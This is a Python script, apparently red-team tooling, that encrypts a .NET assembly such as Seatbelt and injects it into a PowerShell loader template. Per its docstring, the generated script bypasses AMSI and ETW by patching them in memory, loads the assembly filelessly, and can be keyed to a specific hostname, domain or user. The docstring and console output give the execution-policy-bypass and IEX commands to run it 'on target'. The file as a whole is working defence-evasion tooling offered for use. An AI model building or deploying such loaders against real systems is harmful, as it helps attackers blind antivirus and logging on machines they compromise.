#!/usr/bin/env python3
"""
build_powershell.py -- Encrypts a .NET assembly and injects into powershell_cradle.ps1

Generates a .ps1 file that:
  - Bypasses AMSI (reflection + AmsiScanBuffer patch, no Add-Type)
  - Bypasses ETW (patches EtwEventWrite)
  - AES-decrypts and loads the assembly in-memory via [Assembly]::Load
  - No compilation on target — no unsigned DLLs written to disk

Usage:
  python build_powershell.py <assembly_path> [options] [-- <assembly_args>...]

Examples:
  python build_powershell.py Seatbelt.exe -- -group=all
  python build_powershell.py Seatbelt.exe -e xor -- -group=all
  python build_powershell.py Seatbelt.exe --keying hostname=WS01,domain=CORP -- -group=all

On target:
  powershell -ep bypass -f payload_ready.ps1
  powershell -ep bypass -c "IEX (Get-Content payload_ready.ps1 -Raw)"
"""

import argparse
import base64
import hashlib
import os
import re
import sys

KEYING_PROPERTIES = ("hostname", "domain", "user", "machineguid")


def xor_encrypt(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))


def aes_encrypt(data: bytes, key: bytes, iv: bytes) -> bytes:
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        from cryptography.hazmat.primitives import padding
    except ImportError:
        print("[-] AES encryption requires the 'cryptography' package.", file=sys.stderr)
        print("    Install with: pip install cryptography", file=sys.stderr)
        print("    Or use -e xor for XOR encryption (no dependencies).", file=sys.stderr)
        sys.exit(1)

    padder = padding.PKCS7(128).padder()
    padded = padder.update(data) + padder.finalize()

    cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
    encryptor = cipher.encryptor()
    return encryptor.update(padded) + encryptor.finalize()


def parse_keying(spec: str) -> dict:
    result = {}
    for pair in spec.split(","):
        pair = pair.strip()
        if "=" not in pair:
            print(f"[-] Invalid keying spec: {pair} (expected name=value)", file=sys.stderr)
            sys.exit(1)
        name, value = pair.split("=", 1)
        name = name.strip().lower()
        if name not in KEYING_PROPERTIES:
            print(f"[-] Unknown keying property: {name}", file=sys.stderr)
            print(f"    Valid: {', '.join(KEYING_PROPERTIES)}", file=sys.stderr)
            sys.exit(1)
        result[name] = value.strip()
    return result


def derive_key(salt: bytes, keying: dict) -> bytes:
    parts = []
    for name in sorted(keying.keys()):
        parts.append(f"{name}={keying[name].upper()}\n")
    keying_str = "".join(parts)
    return hashlib.sha256(salt + keying_str.encode("utf-8")).digest()


def remove_block(template: str, start_marker: str, end_marker: str) -> str:
    pattern = re.compile(
        rf'^.*{re.escape(start_marker)}.*$\n(.*?\n)*?^.*{re.escape(end_marker)}.*$\n?',
        re.MULTILINE
    )
    return pattern.sub('', template)


def patch_template_for_xor(template: str) -> str:
    template = remove_block(template, "# DECRYPT_AES_START", "# DECRYPT_AES_END")

    xor_block = (
        "$enc=[Convert]::FromBase64String(\"YOURPAYLOADHERE\")\n"
        "$clear=New-Object byte[] $enc.Length\n"
        "for($i=0;$i -lt $enc.Length;$i++){\n"
        "$clear[$i]=$enc[$i] -bxor $keyBytes[$i % $keyBytes.Length]\n"
        "}\n"
    )
    template = template.replace(
        "$enc=$null;$keyBytes=$null;$ivBytes=$null",
        xor_block + "\n$enc=$null;$keyBytes=$null"
    )

    return template


def main():
    argv = sys.argv[1:]
    assembly_args = []
    if "--" in argv:
        split_idx = argv.index("--")
        assembly_args = argv[split_idx + 1:]
        argv = argv[:split_idx]

    parser = argparse.ArgumentParser(
        description="Encrypt a .NET assembly and inject into powershell_cradle.ps1"
    )
    parser.add_argument("assembly", help="Path to .NET assembly (.exe or .dll)")
    parser.add_argument(
        "-e", "--encryption", choices=["aes", "xor"], default="aes",
        help="Encryption method: aes (AES-256-CBC, default) or xor"
    )
    parser.add_argument("--key", help="Encryption key as hex")
    parser.add_argument("--iv", help="AES IV as hex (16 bytes / 32 hex chars)")
    parser.add_argument(
        "--keying",
        help="Environmental keying: name=value,name=value. "
             "Properties: hostname, domain, user, machineguid."
    )
    parser.add_argument("-o", "--output", help="Output .ps1 file (default: payload_ready.ps1)")
    parser.add_argument("--template", help="Template .ps1 file to use")
    args = parser.parse_args(argv)

    if args.keying and args.encryption == "xor":
        print("[-] --keying requires AES encryption.", file=sys.stderr)
        sys.exit(1)
    if args.keying and args.key:
        print("[-] --keying and --key are mutually exclusive.", file=sys.stderr)
        sys.exit(1)

    script_dir = os.path.dirname(os.path.abspath(__file__))
    template_path = args.template or os.path.join(script_dir, "powershell_cradle.ps1")
    output_path = args.output or os.path.join(script_dir, "output", "payload_ready.ps1")
    os.makedirs(os.path.dirname(output_path), exist_ok=True)

    if not os.path.exists(args.assembly):
        print(f"[-] Assembly not found: {args.assembly}", file=sys.stderr)
        sys.exit(1)
    if not os.path.exists(template_path):
        print(f"[-] Template not found: {template_path}", file=sys.stderr)
        sys.exit(1)

    with open(args.assembly, "rb") as f:
        assembly_bytes = f.read()
    print(f"[*] Assembly: {args.assembly} ({len(assembly_bytes)} bytes)", file=sys.stderr)

    with open(template_path, "r") as f:
        template = f.read()

    # --- Encryption ---

    if args.encryption == "xor":
        if args.key:
            key = bytes.fromhex(args.key)
        else:
            key = os.urandom(16)

        print(f"[*] Mode: XOR", file=sys.stderr)
        print(f"[*] XOR key: {key.hex()}", file=sys.stderr)

        encrypted = xor_encrypt(assembly_bytes, key)
        key_b64 = base64.b64encode(key).decode("ascii")
        encrypted_b64 = base64.b64encode(encrypted).decode("ascii")

        template = remove_block(template, "# KEYING_START", "# KEYING_END")
        template = patch_template_for_xor(template)

        template = template.replace('"YOURPAYLOADHERE"', f'"{encrypted_b64}"')
        template = template.replace('"YOURKEYHERE"', f'"{key_b64}"')

    elif args.keying:
        keying = parse_keying(args.keying)
        salt = os.urandom(16)
        key = derive_key(salt, keying)

        if args.iv:
            iv = bytes.fromhex(args.iv)
        else:
            iv = os.urandom(16)

        keying_names = ",".join(sorted(keying.keys()))

        print(f"[*] Mode: AES-256-CBC + environmental keying", file=sys.stderr)
        print(f"[*] Keying: {keying_names}", file=sys.stderr)
        for name in sorted(keying.keys()):
            print(f"[*]   {name} = {keying[name]}", file=sys.stderr)
        print(f"[*] Salt:    {salt.hex()}", file=sys.stderr)
        print(f"[*] Derived: {key.hex()}", file=sys.stderr)
        print(f"[*] AES IV:  {iv.hex()}", file=sys.stderr)

        encrypted = aes_encrypt(assembly_bytes, key, iv)
        encrypted_b64 = base64.b64encode(encrypted).decode("ascii")
        salt_b64 = base64.b64encode(salt).decode("ascii")
        iv_b64 = base64.b64encode(iv).decode("ascii")

        template = remove_block(template, "# STATICKEY_START", "# STATICKEY_END")

        template = template.replace('"YOURPAYLOADHERE"', f'"{encrypted_b64}"')
        template = template.replace('"YOURSALTHERE"', f'"{salt_b64}"')
        template = template.replace('"YOURKEYINGHERE"', f'"{keying_names}"')
        template = template.replace('"YOURIVHERE"', f'"{iv_b64}"')

    else:
        if args.key:
            key = bytes.fromhex(args.key)
            if len(key) != 32:
                print(f"[-] AES-256 key must be 32 bytes, got {len(key)}", file=sys.stderr)
                sys.exit(1)
        else:
            key = os.urandom(32)

        if args.iv:
            iv = bytes.fromhex(args.iv)
            if len(iv) != 16:
                print(f"[-] AES IV must be 16 bytes, got {len(iv)}", file=sys.stderr)
                sys.exit(1)
        else:
            iv = os.urandom(16)

        print(f"[*] Mode: AES-256-CBC", file=sys.stderr)
        print(f"[*] AES key: {key.hex()}", file=sys.stderr)
        print(f"[*] AES IV:  {iv.hex()}", file=sys.stderr)

        encrypted = aes_encrypt(assembly_bytes, key, iv)
        encrypted_b64 = base64.b64encode(encrypted).decode("ascii")
        key_b64 = base64.b64encode(key).decode("ascii")
        iv_b64 = base64.b64encode(iv).decode("ascii")

        template = remove_block(template, "# KEYING_START", "# KEYING_END")

        template = template.replace('"YOURPAYLOADHERE"', f'"{encrypted_b64}"')
        template = template.replace('"YOURKEYHERE"', f'"{key_b64}"')
        template = template.replace('"YOURIVHERE"', f'"{iv_b64}"')

    print(f"[*] Encrypted payload: {len(base64.b64encode(encrypted).decode())} chars base64",
          file=sys.stderr)

    # --- Assembly args ---

    if assembly_args:
        args_str = ",".join(f'"{a}"' for a in assembly_args)
        template = template.replace("YOURARGS", args_str)
    else:
        template = template.replace("YOURARGS", "")

    with open(output_path, "w") as f:
        f.write(template)

    print(f"[+] Written: {output_path}", file=sys.stderr)
    print(f"[*] On target:", file=sys.stderr)
    print(f"    powershell -ep bypass -f {os.path.basename(output_path)}", file=sys.stderr)


if __name__ == "__main__":
    main()
